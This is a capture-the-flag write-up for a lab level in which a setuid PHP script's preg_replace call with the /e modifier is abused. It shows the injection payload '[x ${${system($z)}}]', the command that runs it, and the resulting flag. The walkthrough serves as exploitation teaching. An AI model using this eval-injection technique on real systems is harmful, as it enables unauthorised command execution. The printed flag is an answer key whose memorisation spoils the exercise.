# level06

Home contains two files : a compiled PHP script `level06`, and its source code in `level06.php`.

A quick `ls -la` tells us that `level06` belongs to user `flag06`, and that it can run as sudo (`rws`) :

```
-rwsr-x---+ 1 flag06  level06 7503 Aug 30  2015 level06
```

We examine the source code in `level06.php` (reformatted for readability) :

```
     1  #!/usr/bin/php
     2  <?php
     3
     4  function y($m) {
     5      $m = preg_replace("/\./", " x ", $m);
     6      $m = preg_replace("/@/", " y", $m);
     7      return $m;
     8  }
     9
    10  function x($y, $z) {
    11      $a = file_get_contents($y);
    12      $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
    13      $a = preg_replace("/\[/", "(", $a);
    14      $a = preg_replace("/\]/", ")", $a);
    15      return $a;
    16  }
    17
    18  $r = x($argv[1], $argv[2]);
    19  print $r;
    20
    21  ?>
```

The script can be ran with `./level06 filename unused_second_argument`. It reads the file supplied as argument, applies a few Regex match replacements on it, and returns the result.

What can we exploit ? The vulnerability is found at line 12, `$a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);`. The `/e` (for 'eval') is a now-deprecated regex option that replaces the match with the *execution* of the second parameter. This means a match here will be replaced by the PHP execution of the code `y("\2")`.

We have our base ingredients. Couple things to note :

- The regex matches `[x *]`, `*` being anything
- The `\2` refers to the regex group. Group 1 is `[x *]`, group 2 is `*`
- We can still execute code in the double-quotes, if we use `${${code_to_execute}}`
- We can use the unused argument `$z` (or `$argv[2]`) to our advantage

Knowing this, we write to a file :

```
echo '[x ${${system($z)}}]' > /tmp/file.txt
```

`[x ${${system($z)}}]` will match the regex, `\2` will be `${${system($z)}}`, so `system($z)` will be executed.

We can now execute our script with the following arguments :

```
./level06 /tmp/file.txt getflag
```

## The flag

The script runs `system("getflag")`, and we get the level 06 flag :

```
wiok45aaoguiboiki2tuin6ub
```